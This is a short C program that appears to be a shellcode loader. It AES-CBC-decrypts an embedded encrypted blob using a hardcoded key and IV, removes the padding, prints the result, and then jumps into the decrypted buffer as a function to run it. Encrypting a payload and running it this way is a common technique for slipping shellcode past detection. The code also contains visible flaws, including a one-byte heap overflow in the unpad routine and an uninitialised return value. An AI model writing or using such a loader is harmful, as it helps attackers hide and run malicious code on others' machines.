#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#define BS 16    //size of the blocks 
#define arrayLength(array) (sizeof((array))/sizeof((array)[0]))

//pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
//unpad = lambda s : s[:-ord(s[len(s)-1:])]

#define CBC 1
#define CTR 0
#define ECB 0

#include "aes.h"

struct unpadded {
    int sizeofbuf;
    uint8_t* buffer;
};



static int test_encrypt_cbc(void);

void ptohex(uint8_t *raw, int size) {
    int i;
    printf("\"");
    for(i = 0; i<size; i++) {
        printf("\\x%02x", raw[i]);
    }
    printf("\";");
   printf("\n"); 
}




// I don't think this is the official unpad method, however it works 
struct unpadded unpad(uint8_t *buf, int size) {
    uint8_t pad = (uint8_t)(*(buf + sizeof(uint8_t)*size-1));
    struct unpadded result; 
    //is not a padding byte 
    if ((pad > BS ) || ( pad <= 0))  {
        return result; 
    }
    //check if correctly padded 
    int i;
    for(i = size - pad; i <= size -1; i++) {
     uint8_t  curr_byte =   (uint8_t) *(buf + sizeof(uint8_t)*i);
     if (curr_byte !=  pad ){
        return result;
     }

    }
    uint8_t* mem = malloc(sizeof(uint8_t)*(size-pad-1));
    memcpy(mem, buf, size-pad);
    result.buffer = mem;
    result.sizeofbuf = size-pad;
    return result;
}


void main() {
    
    uint8_t key[16] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
    uint8_t encrypted[] = "\x89\xe0\x48\xaf\xae\xba\x1c\xc1\x6a\x23\xee\x61\xac\x8d\x31\x4b\x1c\x1c\x15\xc2\x58\xe4\x49\x8b\xb5\x5a\xe1\xf7\x24\x64\x50\xb1"; 

    uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    
    size_t size = sizeof(encrypted) -1 ;

    struct AES_ctx ctx;
    
    AES_init_ctx_iv(&ctx, key, iv);
    
    AES_CBC_decrypt_buffer(&ctx, encrypted, size);
    printf("======= KEY: =======\n\n");
    ptohex(key, 16);
    printf("\n\n");
    
    printf("====== IV: ========\n\n");
    ptohex(iv, 16);

    printf("\n\n");

    printf("\n\n======== CBC decrypt: ==========\n\n");
    //ptohex(encrypted, size);
    printf("\n\n");
    struct unpadded result;
    result  = unpad(encrypted, size);
    ptohex(result.buffer, result.sizeofbuf);
    

    //execute!!!!
    printf("Shellcode Length:  %d\n", result.sizeofbuf);
    int (*ret)() = (int(*)())result.buffer;
    ret();


}

